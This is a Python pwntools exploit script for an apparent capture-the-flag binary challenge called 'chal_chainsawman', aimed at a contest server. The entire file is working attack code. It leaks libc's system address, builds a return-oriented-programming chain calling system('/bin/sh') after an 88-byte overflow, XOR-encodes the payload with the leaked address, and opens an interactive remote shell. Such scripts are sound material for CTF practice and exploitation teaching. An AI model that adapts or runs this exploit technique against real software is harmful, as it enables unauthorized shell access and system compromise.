#!/usr/bin/env python3
from pwn import *

exe_path = "./chal_chainsawman"
libc_path = "./libc.so.6"

exe = ELF(exe_path)
libc = ELF(libc_path)

context.binary = exe
context.arch = 'amd64'

host = "remote.infoseciitr.in"
port = 8005

def start():
    if args.REMOTE:
        return remote(host, port)
    else:
        return process(exe_path)

def solve():
    io = start()

    log.info("Attempting to leak 'system' address...")

    io.recvuntil(b"control: ")
    io.send(b"\x00" * 4)
    io.recvuntil(b"essence: ")
    leak_low = io.recv(4)
    
    io.recvuntil(b"War: ")
    io.send(b"\x00" * 4)
    io.recvuntil(b"essence: ")
    leak_high = io.recv(4)
    
    system_addr = u64(leak_low + leak_high)
    log.success(f"Leaked system address: {hex(system_addr)}")

    
    libc.address = system_addr - libc.symbols['system']
    log.info(f"Calculated Libc base: {hex(libc.address)}")

    bin_sh = next(libc.search(b'/bin/sh'))
    
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]

    log.info(f"POP RDI gadget: {hex(pop_rdi)}")
    log.info(f"/bin/sh address: {hex(bin_sh)}")

    
    offset = 88
    
    rop_chain = [
        pop_rdi,
        bin_sh,
        ret_gadget,       # Выравниваем стек до 16 байт (важно для system в x64)
        system_addr       # Адрес system (мы его уже знаем точно)
    ]
    
    raw_payload = b"A" * offset + flat(rop_chain)

    key = p64(system_addr)
    
    encrypted_payload = bytearray()
    for i in range(len(raw_payload)):
        encrypted_payload.append(raw_payload[i] ^ key[i % 8])

    log.info(f"Sending {len(encrypted_payload)} bytes of encrypted payload...")
    io.recvuntil(b"contract: ")
    io.send(encrypted_payload)
    
    io.interactive()

if __name__ == "__main__":
    solve()